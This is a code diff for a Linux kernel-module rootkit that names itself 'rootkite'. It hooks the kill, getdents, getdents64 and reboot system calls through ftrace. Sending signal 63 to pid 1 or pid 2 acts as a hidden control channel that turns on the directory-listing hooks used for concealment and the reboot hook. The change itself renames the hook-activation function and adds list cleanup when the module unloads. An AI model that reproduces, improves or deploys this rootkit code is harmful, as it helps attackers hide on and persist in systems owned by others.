@@ -39,7 +39,7 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
 };
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig);
-static ftrace_hook ACTIVE_HOOKS[] = {
+static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hack_getdents, &orig_getdents),
     HOOK("sys_kill", hack_kill, &orig_kill),
@@ -67,15 +67,15 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
         }
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
     }
     else if ((sig == 63) && (pid == 2)){
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
@@ -100,15 +100,15 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
         }
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
     }
     else if ((sig == 63) && (pid == 2)){
-        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
@@ -120,7 +120,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
 static int __init mod_init(void){
     printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
     misc_register(&controller); // register the device for interaction within filesystem
-    if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
+    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
     }
     return 0;
@@ -129,6 +129,7 @@ static int __init mod_init(void){
 
 static void __exit mod_exit(void){
     fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
+    cleanup_lists();
     misc_deregister(&controller); // deregister the device controller
     printk(KERN_INFO "rootkite: exit\n");
 }
